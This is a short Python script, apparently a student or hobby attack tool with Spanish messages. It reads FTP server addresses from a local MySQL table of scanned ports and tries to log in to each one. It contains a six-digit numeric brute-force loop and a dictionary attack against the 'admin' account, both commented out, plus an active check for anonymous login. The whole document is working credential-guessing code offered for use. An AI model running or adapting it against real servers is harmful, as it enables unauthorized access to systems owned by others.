from ftplib import FTP
import mysql.connector as mysql

def fuerzabruta(user, ip):
	con = True
	contador = 0 
	while(contador <= 999999):

		msj = "Falló la conexión!"
		password = str(contador).zfill(6)
		print (password)
		

		try:
			tp = FTP(ip, user, password)
			con = False 
		except:
		    con = True 


		if not con:
			msj = "Conexión establecida!!!"
			pass
		print ("\nip: "+ip+" :: usuario: "+user+" + contraseña: "+password+" = " + str(not con)+" :: "+msj)
		contador = contador + 1
		if not con:
			break 
	
def diccionario(user, ip):
	f = open("8-more-passwords.txt", "r")
	con = True
	
	
	password = "135246113"
	while(con):

		linea = f.readline()
		msj = "Falló la conexión!"
		
		password = linea [0:(len(linea)-1)]

		try:
			tp = FTP(ip, user, password)
			con = False 
		    

		except:
		    con = True 


		if not con:
			msj = "Conexión establecida!!!"
			pass
		print ("\nip: "+ip+" :: usuario: "+user+" + contraseña: "+password+" = " + str(not con)+" :: "+msj)

		if not linea:
			break 

def anonim(ip):
	con = True
	user = "anonymous"
	password = ""
	

	msj = "Falló la conexión!"
		

	try:
		tp = FTP(ip, user, password)
		con = False 
		    

	except:
		con = True 


	if not con:
		msj = "Conexión establecida!!!"
		pass
	print ("\nip del servidor: "+ ip)
	print ("Usuario: "+user+" + Contraseña: "+password+" = " + str(not con)+" :: "+msj)


con = mysql.connect( host='localhost', user= 'root', passwd='', db='puertos' )
sql = con.cursor()
sql.execute( "SELECT * FROM datos WHERE service = 'ftp\n' ; " )
query = sql.fetchall()

#for row in query:
#    fuerzabruta("admin",row[0])

#for row in query:
#    diccionario("admin",row[0])

for row in query:
    anonim(row[0])